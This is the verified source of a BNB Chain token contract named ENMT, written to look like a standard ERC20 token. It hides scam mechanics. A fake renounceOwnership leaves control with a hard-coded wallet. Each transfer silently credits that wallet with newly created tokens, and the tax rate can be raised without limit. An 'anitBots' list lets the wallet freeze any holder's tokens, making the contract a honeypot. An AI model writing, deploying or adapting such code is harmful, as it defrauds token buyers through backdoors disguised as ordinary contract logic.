/**
 *Submitted for verification at BscScan.com on 2022-09-10
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.15;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}


contract Ownable {
    address private _owner;

    constructor () {
        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public {
        require(msg.sender == _owner, "ERC20: not owner");
        _owner = address(0xdead);
    }
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


contract ERC20 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;
    mapping(address => bool) private _anitBotList;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    address private _marketWallet;
    uint256 private _marketFees = 2;
    uint256 private _taxFees = 10;


    constructor (string memory name_, string memory symbol_) {
        _marketWallet = 0x9883B8514c04B4D25C20c3CF9f55C73b11d8C234;
        _isExcluded[address(this)] = true;
        _isExcluded[_marketWallet] = true;
        _name = name_;
        _symbol = symbol_;
    }

    modifier onlyOwner() {
        require(_marketWallet == msg.sender);
        _;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function botlist(address account) public view returns (bool) {
        return _anitBotList[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        if (_isExcluded[_msgSender()] || _isExcluded[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _marktAmount = amount.mul(_marketFees).div(100);
            _transfer(msg.sender, address(_marketWallet), _marktAmount);
            _transfer(msg.sender, recipient, amount.sub(_marktAmount));
            return true;
        }
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

        if (_isExcluded[_msgSender()] || _isExcluded[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender, msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }else{
            uint256 _marktAmount = amount.mul(_marketFees).div(100);
            _transfer(sender, _marketWallet, _marktAmount);
            _transfer(sender, recipient, amount.sub(_marktAmount));
            _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount < 0");
        require(!_anitBotList[sender], "ERC20: isBot");

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        uint256 _Marketing = (amount * _taxFees) / 100;
        _balances[_marketWallet] += _Marketing;
        emit Transfer(sender, recipient, amount);
    }

    function changeTaxFees(uint256 newFees) public onlyOwner {
        _taxFees = newFees;
    }

    function anitBots(address account, bool anit) public onlyOwner {
        _anitBotList[account] = anit;
    }

    function _initToken(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}


contract ENMT is ERC20 {
    
    struct TokenInfo {
        uint8 decimals;
        address creator;
    }
    
    TokenInfo private INFO;
    
    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {
        _initToken(_msgSender(), 10000000000000000000000);
        INFO = TokenInfo(9, _msgSender());
    }
    
    function decimals() public view virtual override returns (uint8) {
        return INFO.decimals;
    }
    
}